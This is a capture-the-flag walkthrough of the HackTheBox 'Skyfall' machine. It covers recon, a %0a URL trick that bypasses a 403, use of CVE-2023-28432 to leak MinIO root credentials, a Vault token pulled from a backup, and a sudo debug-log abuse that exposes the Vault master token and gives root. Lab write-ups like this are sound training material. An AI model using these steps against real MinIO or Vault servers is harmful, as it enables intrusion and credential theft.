# 🛸 Skyfall HackTheBox Walkthrough!!

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Add IP to /etc/hosts to Load.

```
┌──(Batman㉿GC)-[~]
└─$ sudo nano /etc/hosts 
```

**NMAP RESULT**

```
┌──(Batman㉿GC)-[~]
└─$ nmap -A 10.10.11.254 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 18:18 IST
Nmap scan report for skyfall.htb (10.10.11.254)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.92 seconds
```

Lets run **Gobuster** to finds **Subdomains.**

```
┌──(Batman㉿GC)-[~]
└─$ gobuster dns -d skyfall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 20
```

We found a subdomain **demo.skyfall.htb**, and that to host file.

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p><a href="http://demo.subdomain.htb/">http://demo.subdomain.htb/</a></p></figcaption></figure>

We can use default credentials to login.

```
guest:guest
```

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

In left of the panel, We can see Min10 Metrices. When we try to access Min10 Metrices its showing 403 forbidden!!

So I bypassed it with by adding %0a in the end of url.

```
http://demo.skyfall.htb/metrics%0a
```

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p><a href="http://demo.skyfall.htb/metrics">http://demo.skyfall.htb/metrics%0a</a></p></figcaption></figure>

We can see an url at endpoint

```
 http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster
```

Add **prd23-s3-backend.skyfall.htb** into /etc/hosts file.

We found a vulnerability [CVE-2023–28432](https://www.cvedetails.com/cve/CVE-2023-28432/).

[GITHUB POC](https://github.com/acheiii/CVE-2023-28432.git)

We have to test this **“Information Leak Vulnerability”** about minio. With this vulnerability, I could find some credentials about minio.

Use **BurpSuite** to intercept and get credentials.

```
"MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww"
"MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0"
```

To Install [**Min10 Client**](https://min.io/docs/minio/linux/reference/minio-mc.html)

Now lets run the Min10 Client

```
┌──(Batman㉿GC)-[~/minio-binaries]
└─$ ./mc alias set myminio http://prd23-s3-backend.skyfall.htb/ 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
Added `myminio` successfully.
```

Lets check for files.

```
┌──(Batman㉿GC)-[~/minio-binaries]
└─$ ./mc ls -r --versions myminio                                                                        
[2023-11-08 10:29:15 IST]     0B askyy/
[2023-11-08 11:05:28 IST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
[2023-11-10 03:07:25 IST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
[2023-11-10 03:07:09 IST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
[2023-11-10 03:06:30 IST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
[2023-11-08 10:28:56 IST]     0B btanner/
[2023-11-08 11:05:36 IST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
[2023-11-08 10:28:33 IST]     0B emoneypenny/
[2023-11-08 11:05:56 IST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
[2023-11-08 10:28:22 IST]     0B gmallory/
[2023-11-08 11:06:02 IST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
[2023-11-08 05:38:01 IST]     0B guest/
[2023-11-08 05:38:05 IST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
[2023-11-08 10:29:05 IST]     0B jbond/
[2023-11-08 11:05:45 IST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
[2023-11-08 10:28:10 IST]     0B omansfield/
[2023-11-08 11:06:09 IST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
[2023-11-08 10:28:45 IST]     0B rsilva/
[2023-11-08 11:05:51 IST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
```

Here we can find some backupfiles with **.gz** extension. I tried to download those files and decompress them.

```
┌──(Batman㉿GC)-[~/minio-binaries]
└─$ ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz .
...yy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.31 KiB/s 2s
```

```
┌──(Batman㉿GC)-[~/minio-binaries]
└─$ ls
home_backup.tar.gz
```

```
┌──(Batman㉿GC)-[~/minio-binaries]
└─$ tar -xzvf home_backup.tar.gz  
./
./.profile
./.bashrc
./.ssh/
./.ssh/authorized_keys
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
```

On further enumeration of files with **.gz** we found these,

```
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb/"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"// Some code
```

To Install [**VAULT**](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords).

Add **prd23-vault-internal.skyfall.htb** to /etc/hosts file.

Run the command as follows.

```
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

```
┌──(Batman㉿GC)-[~/Downloads]
└─$ ./vault login
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or                                                             
update its value accordingly.                                                                                                              
                                                                                                                                           
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       435850h57m1s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```

Primarily, Import configuration file into Vault, and then verified that the token value is valid.

To get user access, Run the following code, a **OTP** will be generated and use the **OTP** as the password of **SSH** connection.

```
┌──(Batman㉿GC)-[~/Downloads]
└─$ ./vault ssh -role dev_otp_key_role -mode otp askyy@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                                                 
Vault can automatically perform this step for you.                                                                                         
OTP for the session is: d1367bfe-8d4d-e3f5-2d7c-a85bd74be723
(askyy@10.10.11.254) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
askyy@skyfall:~$ls
user.txt
askyy@skyfall:~$ cat user.txt
0031538fb5a589850------------
askyy@skyfall:~$
```

**PRIVILEGE ESCALATION:**

```
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
askyy@skyfall:~$
```

I ran **root/vault/vault-unseal -c /etc/vault-unseal.yaml**

```
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

We can see a master token is being generated, we need to copy that to a log file.

So we need to create a **.log** file in current directory.

```
askyy@skyfall:~$ touch debug.log
```

Give the user’s claim permissions to **debug.log.**

```
askyy@skyfall:~$ chown askyy:askyy debug.log
```

```
askyy@skyfall:~$ ls -la
total 32
drwxr-x--- 4 askyy askyy 4096 Feb  7 17:46 .
drwxr-xr-x 3 root  root  4096 Jan 19 21:33 ..
lrwxrwxrwx 1 askyy askyy    9 Nov  9 21:30 .bash_history -> /dev/null
-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 askyy askyy 3771 Nov  9 21:30 .bashrc
drwx------ 2 askyy askyy 4096 Oct  9 18:47 .cache
-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
drwx------ 2 askyy askyy 4096 Jan 18 10:32 .ssh
-rw-rw-r-- 1 askyy askyy    0 Feb  7 17:46 debug.log
-rw-r----- 1 root  askyy   33 Feb  7 17:37 user.txt
```

Now the debug.log can be written in **askyy’s** posession.

Now run the following command.

```
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d -v /home/askyy/debug.log
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```

Here the Master Token has been written to **debug.log** file.

Read the **debug.log** file.

```
askyy@skyfall:~$ cat debug.log
2024/02/07 17:48:21 Initializing logger...
2024/02/07 17:48:21 Reading: /etc/vault-unseal.yaml
2024/02/07 17:48:21 Security Risk!
2024/02/07 17:48:21 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
2024/02/07 17:48:21 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/02/07 17:48:21 Check interval: 5s
2024/02/07 17:48:21 Max checks: 5
2024/02/07 17:48:21 Establishing connection to Vault...
2024/02/07 17:48:21 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/02/07 17:48:21 Checking seal status
2024/02/07 17:48:21 Vault sealed: false
```

Now we can see we are now connected to **Vault.**

We can try the same way that we used to login user **askyy.**

```
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/"
export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
export VAULT_NAMESPACE="root"
```

To get root access, Run the following code, a **OTP** will be generated and use the **OTP** as the password of **SSH** connection.

```
┌──(Batman㉿GC)-[~/Downloads]
└─$ ./vault ssh -role admin_otp_key_role -mode otp root@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 2b26b6b2-bfc9-e6bb-21bc-9e3afecdc53a
(root@10.10.11.254) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jan 30 12:17:37 2024
root@skyfall:~# cat root.txt
8730895c4fcb0f92bc9a-----------
root@skyfall:~#
```

Hurray!! Got the root access.

<figure><img src=".gitbook/assets/image.png" alt="" width="375"><figcaption><p><a href="https://www.buymeacoffee.com/b4tm4n">https://www.buymeacoffee.com/b4tm4n</a></p></figcaption></figure>
